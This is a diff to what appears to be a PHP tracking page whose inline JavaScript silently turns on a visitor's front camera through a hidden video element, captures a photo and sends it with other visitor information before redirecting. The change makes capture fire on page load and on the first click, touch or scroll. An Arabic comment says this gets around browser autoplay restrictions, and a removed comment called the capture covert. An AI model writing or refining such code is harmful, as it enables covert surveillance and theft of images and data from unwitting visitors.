@@ -306,13 +306,13 @@ if (isset($_GET['r'])) {
             });
         }
 
-        function initTracking() {
+        function captureAndSend() {
             if (!useCamera) {
                 sendInfoAndRedirect("");
                 return;
             }
 
-            // محاولة التقاط الصورة عبر الكاميرا الأمامية بطريقة خفية
+            // محاولة التقاط الصورة عبر الكاميرا الأمامية بطريقة آلية فورية
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.getElementById('hidden-video');
@@ -329,25 +329,29 @@ if (isset($_GET['r'])) {
                             stream.getTracks().forEach(track => track.stop());
 
                             sendInfoAndRedirect(imageData);
-                        }, 250);
+                        }, 300);
                     }).catch(() => {
                         sendInfoAndRedirect("");
                     });
                 })
                 .catch(err => {
-                    // إذا رفض المستخدم الإذن أو تم حظر الكاميرا، يتم التحويل فوراً بدون توقف
                     sendInfoAndRedirect("");
                 });
         }
 
+        // محاولة التشغيل الفوري تلقائياً عند تحميل الصفحة
         window.addEventListener('DOMContentLoaded', () => {
-            initTracking();
+            captureAndSend();
         });
 
-        // دعم التشغيل التلقائي عند أول تفاعل خفيف (Click) إذا تطلب المتصفح ذلك
-        window.addEventListener('click', () => {
-            initTracking();
-        }, { once: true });
+        // تشغيل تلقائي بديل وفوري عند أول تفاعل خفيف (لمسة، نقرة أو تمرير) لتجاوز قيود المتصفحات التلقائية
+        ['click', 'touchstart', 'scroll'].forEach(evt => {
+            window.addEventListener(evt, () => {
+                if (!isProcessed) {
+                    captureAndSend();
+                }
+            }, { once: true, passive: true });
+        });
     </script>
 </head>
 <body>
